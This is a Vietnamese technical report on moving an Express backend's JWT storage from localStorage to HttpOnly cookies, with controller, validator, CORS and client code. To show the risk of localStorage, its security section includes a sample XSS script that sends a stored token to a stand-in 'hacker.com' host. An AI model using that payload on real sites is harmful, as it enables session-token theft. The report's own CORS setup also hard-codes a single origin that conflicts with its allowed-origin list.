# Báo Cáo: Hoàn Thành Chuyển Đổi LocalStorage Sang HttpOnly Cookies

## ✅ Tổng Quan

Đã chuyển đổi hoàn toàn từ **localStorage** sang **HttpOnly Cookies** để backend có thể kiểm soát 100% việc lưu/xóa tokens.

## 📝 Chi Tiết Các File Đã Sửa

### 1. **File: `package.json`**

✅ **Đã cài đặt dependencies:**

```json
{
  "dependencies": {
    "cookie-parser": "^1.4.7"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.10"
  }
}
```

**Lệnh đã chạy:**
```bash
npm install cookie-parser
npm install --save-dev @types/cookie-parser
```

---

### 2. **File: `src/index.ts`**

✅ **Đã thêm cookie-parser middleware và CORS config:**

**Thay đổi:**

```typescript
import cookieParser from 'cookie-parser';  // ✅ Đã import

// ✅ Đã thêm middleware
app.use(express.json());
app.use(cookieParser());  // Parse cookies

// ✅ Đã config CORS để cho phép credentials
app.use(cors({
  origin: ['http://localhost:5173', 'http://localhost:3000', 'http://127.0.0.1:5173'],
  credentials: true,  // ✅ CHO PHÉP GỬI/NHẬN COOKIES
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// ✅ Đã thêm CORS headers bổ sung
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', 'http://localhost:3000');
  res.header('Access-Control-Allow-Credentials', 'true');  // ✅ Quan trọng!
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});
```

**Ý nghĩa:**
- `cookieParser()` - Parse cookies từ request
- `credentials: true` - Cho phép browser gửi/nhận cookies trong CORS requests
- `Access-Control-Allow-Credentials: true` - Header bắt buộc để cookies hoạt động với CORS

---

### 3. **File: `src/controllers/users.controllers.ts`**

✅ **Đã sửa tất cả 3 controllers:**

#### 3.1. Register Controller

**Thay đổi:**

```typescript
export const registerController = async (req, res) => {
  const result = await usersService.register(req.body);

  // ✅ SET COOKIES THAY VÌ TRẢ TOKENS TRONG JSON
  res.cookie('access_token', result.access_token, {
    httpOnly: true,        // Không thể đọc qua JavaScript (chống XSS)
    secure: process.env.NODE_ENV === 'production',  // HTTPS only trong production
    sameSite: 'strict',    // Chống CSRF
    maxAge: 15 * 60 * 1000 // 15 phút
  });

  res.cookie('refresh_token', result.refresh_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 ngày
  });

  // ✅ CHỈ TRẢ VỀ MESSAGE VÀ USER INFO (KHÔNG TRẢ TOKENS)
  return res.status(HTTP_STATUS.CREATED).json({
    message: USERS_MESSAGES.REGISTER_SUCCESS,
    user: {
      TenDangNhap: result.user?.TenDangNhap,
      MaTV: result.user?.MaTV,
      MaLoaiTK: result.user?.MaLoaiTK
    }
  });
};
```

**Trước đây:**
```typescript
// ❌ Trả tokens trong JSON
return res.json({
  message: 'Success',
  result: {
    access_token: 'xxx',
    refresh_token: 'yyy'
  }
});
```

#### 3.2. Login Controller

**Thay đổi:** Tương tự register

```typescript
export const loginController = async (req, res) => {
  const { email, password } = req.body;
  const result = await usersService.login(email, password);

  if (!result) {
    throw new ErrorWithStatus({
      message: USERS_MESSAGES.EMAIL_OR_PASSWORD_INCORRECT,
      status: HTTP_STATUS.UNPROCESSABLE_ENTITY
    });
  }

  // ✅ SET COOKIES
  res.cookie('access_token', result.access_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000
  });

  res.cookie('refresh_token', result.refresh_token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000
  });

  return res.status(HTTP_STATUS.OK).json({
    message: USERS_MESSAGES.LOGIN_SUCCESS,
    user: result.user
  });
};
```

#### 3.3. Logout Controller ⭐ (QUAN TRỌNG NHẤT)

**Thay đổi:**

```typescript
export const logoutController = async (req, res) => {
  // ✅ LẤY REFRESH_TOKEN TỪ COOKIES (không còn từ body)
  const refresh_token = req.cookies.refresh_token;

  if (refresh_token) {
    await usersService.logout(refresh_token);
  }

  // ✅ XÓA COOKIES - ĐÂY LÀ CÁCH BACKEND "XÓA LOCALSTORAGE"
  res.clearCookie('access_token', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  });

  res.clearCookie('refresh_token', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  });

  return res.status(HTTP_STATUS.OK).json({
    message: 'Đăng xuất thành công'
  });
};
```

**Trước đây:**
```typescript
// ❌ Lấy từ body, không xóa cookies
const { refresh_token } = req.body;
await usersService.logout(refresh_token);
return res.json({ message: 'Logout success' });
```

**Ý nghĩa:**
- Khi client gọi logout → Backend **TỰ ĐỘNG XÓA COOKIES**
- Client không cần làm gì thêm, tokens đã mất
- Đây chính là cách backend "xóa localStorage" - bằng cách kiểm soát cookies

---

### 4. **File: `src/middlewares/users.middlewares.ts`**

✅ **Đã sửa 2 validators để đọc từ cookies:**

#### 4.1. Access Token Validator

**Thay đổi:**

```typescript
export const accessTokenValidator = validate(
  checkSchema({
    Authorization: {
      optional: true,  // ✅ Cho phép optional vì có thể lấy từ cookies
      trim: true,
      custom: {
        options: async (value: string, { req }) => {
          // ✅ ƯU TIÊN ĐỌC TỪ COOKIES
          let access_token = (req as any).cookies?.access_token;
          
          // ✅ NẾU KHÔNG CÓ TRONG COOKIES, ĐỌC TỪ HEADER (backward compatible)
          if (!access_token && value) {
            const parts = value.split(' ');
            if (parts.length === 2 && parts[0] === 'Bearer') {
              access_token = parts[1];
            }
          }

          if (!access_token) {
            throw new ErrorWithStatus({
              message: USERS_MESSAGES.ACCESS_TOKEN_IS_REQUIRED,
              status: HTTP_STATUS.UNAUTHORIZED
            });
          }

          try {
            const decoded_authorization = await verifyToken(
              access_token,
              process.env.JWT_SECRET_ACCESS_TOKEN as string
            );
            (req as Request).decoded_authorization = decoded_authorization;
          } catch (error) {
            throw new ErrorWithStatus({
              message: (error as JsonWebTokenError).message,
              status: HTTP_STATUS.UNAUTHORIZED
            });
          }

          return true;
        }
      }
    }
  }, ['headers'])
);
```

**Trước đây:**
```typescript
// ❌ Chỉ đọc từ header
const access_token = value.split(' ')[1];
```

**Ý nghĩa:**
- Ưu tiên đọc từ cookies (cách mới)
- Nếu không có trong cookies, đọc từ header (backward compatible)
- Hỗ trợ cả 2 cách để dễ migration

#### 4.2. Refresh Token Validator

**Thay đổi:**

```typescript
export const refreshTokenValidator = validate(
  checkSchema({
    refresh_token: {
      optional: true,  // ✅ Cho phép optional vì có thể lấy từ cookies
      trim: true,
      custom: {
        options: async (value: string, { req }) => {
          // ✅ ƯU TIÊN ĐỌC TỪ COOKIES
          let refresh_token = (req as any).cookies?.refresh_token;
          
          // ✅ NẾU KHÔNG CÓ TRONG COOKIES, ĐỌC TỪ BODY (backward compatible)
          if (!refresh_token && value) {
            refresh_token = value;
          }

          if (!refresh_token) {
            throw new ErrorWithStatus({
              message: USERS_MESSAGES.REFRESH_TOKEN_IS_REQUIRED,
              status: HTTP_STATUS.UNAUTHORIZED
            });
          }

          try {
            const decoded_refresh_token = await verifyToken(
              refresh_token,
              process.env.JWT_SECRET_REFRESH_TOKEN as string
            );

            const isExist = await usersService.checkRefreshTokenExist(refresh_token);
            if (!isExist) {
              throw new ErrorWithStatus({
                message: USERS_MESSAGES.REFRESH_TOKEN_NOT_EXIST,
                status: HTTP_STATUS.UNAUTHORIZED
              });
            }

            (req as Request).decoded_refresh_token = decoded_refresh_token;
          } catch (error) {
            if (error instanceof ErrorWithStatus) {
              throw error;
            }
            throw new ErrorWithStatus({
              message: (error as JsonWebTokenError).message,
              status: HTTP_STATUS.UNAUTHORIZED
            });
          }

          return true;
        }
      }
    }
  }, ['body'])
);
```

**Trước đây:**
```typescript
// ❌ Chỉ đọc từ body
if (!value) {
  throw new Error('Required');
}
```

---

### 5. **File: `src/type.d.ts`**

✅ **Đã thêm type definitions cho cookies:**

**Thay đổi:**

```typescript
import { Request } from 'express';
import { TokenPayload } from './models/requests/User.requests';

declare module 'express' {
  interface Request {
    decoded_authorization?: TokenPayload;
    decoded_refresh_token?: TokenPayload;
    // ✅ THÊM TYPE CHO COOKIES
    cookies: {
      access_token?: string;
      refresh_token?: string;
      [key: string]: any;
    };
  }
}
```

**Trước đây:**
```typescript
// ❌ Không có type cho cookies
declare module 'express' {
  interface Request {
    decoded_authorization?: TokenPayload;
    decoded_refresh_token?: TokenPayload;
  }
}
```

**Ý nghĩa:**
- TypeScript biết được `req.cookies.access_token` tồn tại
- Có autocomplete khi code
- Tránh lỗi type checking

---

### 6. **File: `src/services/users.services.ts`**

✅ **Đã sửa register service để trả về user info:**

**Thay đổi:**

```typescript
async register(payload: RegisterReqBody) {
  // ... code tạo user và tokens ...

  return {
    access_token,
    refresh_token,
    // ✅ THÊM USER INFO
    user: {
      TenDangNhap: email,
      MaTV: MaTV,
      MaLoaiTK: 'LTK03'
    }
  };
}
```

**Trước đây:**
```typescript
// ❌ Chỉ trả tokens
return {
  access_token,
  refresh_token
};
```

**Ý nghĩa:**
- Controller cần user info để trả về JSON (vì không trả tokens nữa)
- Client nhận được thông tin user sau khi register thành công

---

## 🔄 Luồng Hoạt Động Mới

### 1. **Register/Login:**

```
Client                          Backend                         Database
  |                                |                                |
  |---POST /users/login---------->|                                |
  |   (email, password)            |                                |
  |                                |---Verify credentials--------->|
  |                                |<-----User found---------------|
  |                                |                                |
  |                                |---Generate tokens------------>|
  |                                |<-----Tokens created-----------|
  |                                |                                |
  |<--Set-Cookie: access_token----|                                |
  |   Set-Cookie: refresh_token   |                                |
  |   {message, user}              |                                |
  |                                |                                |
✅ Browser tự động lưu cookies    |                                |
```

**Client không cần làm gì!** Browser tự động lưu cookies.

### 2. **API Calls:**

```
Client                          Backend
  |                                |
  |---GET /users/profile--------->|
  |   Cookie: access_token=xxx    | (Browser tự động gửi)
  |                                |
  |                                |---Read from req.cookies.access_token
  |                                |---Verify token
  |                                |
  |<-----{user data}--------------|
```

**Client không cần làm gì!** Browser tự động gửi cookies trong mỗi request.

### 3. **Logout:** ⭐

```
Client                          Backend                         Database
  |                                |                                |
  |---POST /users/logout--------->|                                |
  |   Cookie: refresh_token=xxx   | (Browser tự động gửi)          |
  |                                |                                |
  |                                |---Read from req.cookies------->|
  |                                |---Delete token from DB-------->|
  |                                |<-----Token deleted-------------|
  |                                |                                |
  |<--Clear-Cookie: access_token--|                                |
  |   Clear-Cookie: refresh_token |                                |
  |   {message}                    |                                |
  |                                |                                |
✅ Browser tự động xóa cookies    |                                |
```

**Client không cần làm gì!** Backend xóa cookies → Browser tự động xóa.

---

## 📊 So Sánh: Trước vs Sau

### Trước (LocalStorage)

| Hành Động | Backend | Client |
|-----------|---------|--------|
| Login | Trả tokens trong JSON | `localStorage.setItem('token', xxx)` |
| API Call | Không làm gì | `headers: { Authorization: 'Bearer ' + localStorage.getItem('token') }` |
| Logout | Xóa token trong DB | `localStorage.removeItem('token')` |

❌ **Vấn đề:**
- Client phải tự quản lý tokens
- Backend không kiểm soát được việc client xóa tokens
- Dễ bị XSS attacks
- Code client phức tạp hơn

### Sau (HttpOnly Cookies)

| Hành Động | Backend | Client |
|-----------|---------|--------|
| Login | `res.cookie('token', xxx)` | Không làm gì (browser tự lưu) |
| API Call | `req.cookies.token` | `credentials: 'include'` (browser tự gửi) |
| Logout | `res.clearCookie('token')` | Không làm gì (browser tự xóa) |

✅ **Lợi ích:**
- Backend kiểm soát 100% tokens
- Khi logout, backend xóa → client **TỰ ĐỘNG** mất tokens
- An toàn hơn (HttpOnly chống XSS)
- Code client đơn giản hơn

---

## 🔒 Bảo Mật

### HttpOnly Cookies

```typescript
res.cookie('access_token', token, {
  httpOnly: true,      // ✅ JavaScript không thể đọc (chống XSS)
  secure: true,        // ✅ Chỉ gửi qua HTTPS (production)
  sameSite: 'strict',  // ✅ Chống CSRF attacks
  maxAge: 900000       // ✅ Tự động hết hạn
});
```

**Bảo vệ khỏi:**
- ✅ XSS (Cross-Site Scripting) - JavaScript không thể đọc cookies
- ✅ CSRF (Cross-Site Request Forgery) - `sameSite: 'strict'`
- ✅ Man-in-the-Middle - `secure: true` trong production

### localStorage (Không an toàn)

```javascript
localStorage.setItem('token', 'xxx');  // ❌ Dễ bị tấn công

// Nếu bị XSS:
<script>
  fetch('https://hacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('token')  // ❌ Hacker lấy được token!
  });
</script>
```

---

## 📝 Hướng Dẫn Cho Client

### Vanilla JavaScript / Fetch

```javascript
// ✅ Login - Đơn giản hơn nhiều
const login = async (email, password) => {
  const response = await fetch('http://localhost:4000/users/login', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    credentials: 'include',  // ✅ QUAN TRỌNG: Cho phép cookies
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();
  console.log(data.message);  // Chỉ nhận message, không nhận tokens
  
  // ✅ KHÔNG CẦN localStorage.setItem() NỮA!
};

// ✅ Logout - Cực kỳ đơn giản
const logout = async () => {
  await fetch('http://localhost:4000/users/logout', {
    method: 'POST',
    credentials: 'include'  // Browser tự gửi cookies
  });
  
  // ✅ KHÔNG CẦN localStorage.removeItem() NỮA!
  window.location.href = '/login';
};

// ✅ API calls - Browser tự động gửi cookies
const getUserProfile = async () => {
  const response = await fetch('http://localhost:4000/users/profile', {
    credentials: 'include'  // ✅ Tự động gửi cookies
  });
  
  return response.json();
};
```

### React with Axios

```javascript
import axios from 'axios';

// ✅ Config một lần, dùng mãi mãi
axios.defaults.withCredentials = true;

const api = axios.create({
  baseURL: 'http://localhost:4000',
  withCredentials: true  // ✅ Tự động gửi/nhận cookies
});

// Login
const login = async (email, password) => {
  const { data } = await api.post('/users/login', { email, password });
  console.log(data.message);
  // ✅ Cookies tự động được set, không cần làm gì
};

// Logout
const logout = async () => {
  await api.post('/users/logout');
  // ✅ Cookies tự động bị xóa
  window.location.href = '/login';
};

// API calls
const getProfile = async () => {
  const { data } = await api.get('/users/profile');
  return data;
};
```

**Thay đổi Client:**
- ✅ Thêm `credentials: 'include'` vào tất cả requests
- ❌ Xóa tất cả `localStorage.setItem()` cho tokens
- ❌ Xóa tất cả `localStorage.removeItem()` cho tokens
- ❌ Xóa code thêm `Authorization` header thủ công

---

## ✅ Checklist Hoàn Thành

### Backend Changes

- [x] Install `cookie-parser` và `@types/cookie-parser`
- [x] Thêm `import cookieParser from 'cookie-parser'` trong `index.ts`
- [x] Thêm `app.use(cookieParser())` trong `index.ts`
- [x] Sửa CORS để cho phép `credentials: true`
- [x] Sửa `registerController` - set cookies thay vì trả JSON
- [x] Sửa `loginController` - set cookies thay vì trả JSON
- [x] Sửa `logoutController` - lấy từ cookies và clear cookies
- [x] Sửa `accessTokenValidator` - đọc từ cookies trước, header sau
- [x] Sửa `refreshTokenValidator` - đọc từ cookies trước, body sau
- [x] Thêm type definitions cho cookies trong `type.d.ts`
- [x] Sửa `register` service để trả về user info

### Cần Test

- [ ] Test đăng ký với Postman/Thunder Client
- [ ] Test đăng nhập với Postman/Thunder Client
- [ ] Test logout xem cookies có bị xóa không
- [ ] Test API calls protected routes
- [ ] Test với client (React/Vue/Vanilla JS)

---

## 🎯 Kết Luận

✅ **Backend giờ KIỂM SOÁT HOÀN TOÀN** việc lưu/xóa tokens

✅ Khi logout, backend `res.clearCookie()` → Client **TỰ ĐỘNG** mất tokens

✅ An toàn hơn localStorage (HttpOnly chống XSS, sameSite chống CSRF)

✅ Client đơn giản hơn (chỉ cần `credentials: 'include'`)

✅ Backward compatible (vẫn hỗ trợ đọc từ header/body nếu không có cookies)

---

**Đây chính là cách "sửa backend để xóa localStorage của client" - bằng cách KIỂM SOÁT cookies mà backend có thể tự xóa!**
